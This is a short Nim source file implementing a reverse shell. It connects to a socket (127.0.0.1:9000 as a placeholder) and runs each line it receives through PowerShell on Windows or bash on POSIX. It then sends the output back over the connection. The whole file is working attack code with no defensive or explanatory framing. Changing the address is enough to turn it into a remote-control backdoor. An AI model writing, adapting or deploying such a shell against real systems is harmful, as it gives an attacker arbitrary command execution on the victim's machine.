import net, osproc, strformat, times

let 
  ip = "127.0.0.1"
  port = 9000
  sock = newSocket()

sock.connect(ip, Port(port))

let prompt = "ns > "

while true:
  send(sock, prompt)
  let input_cmd = recvLine(sock)

  # If host is Windows, use Powershell as shell
  when defined(windows):
    let cmd = execProcess(fmt"Powershell.exe -Command " & input_cmd)
  # If host is not Windows, use BASH as shell
  when defined(posix):
    let cmd = execProcess(fmt"bash -c " & input_cmd)
  
  send(sock, cmd)
